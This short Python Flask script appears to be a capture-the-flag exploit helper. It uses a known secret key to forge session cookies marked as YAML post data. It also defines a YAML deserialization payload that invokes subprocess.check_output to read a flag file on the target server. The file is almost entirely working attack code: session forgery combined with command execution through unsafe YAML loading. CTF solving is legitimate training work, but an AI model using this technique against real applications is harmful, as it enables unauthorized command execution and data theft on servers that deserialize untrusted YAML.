from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}'


payload = '''
- {author: hack, content: !!python/object/apply:subprocess.check_output [['cat', 'flag2']], date: 'October 08, 2016 02:00:00', title: WOW}
'''

@app.route('/')
def index():
    session.clear()

    session['name'] = 'qwaz'
    session['post_data'] = request.args.get('post_data', '')
    session['post_type'] = 'yaml'

    return 'Your post_data is "%s". Check your cookie.' % session['post_data']


if __name__ == "__main__":
    app.run()
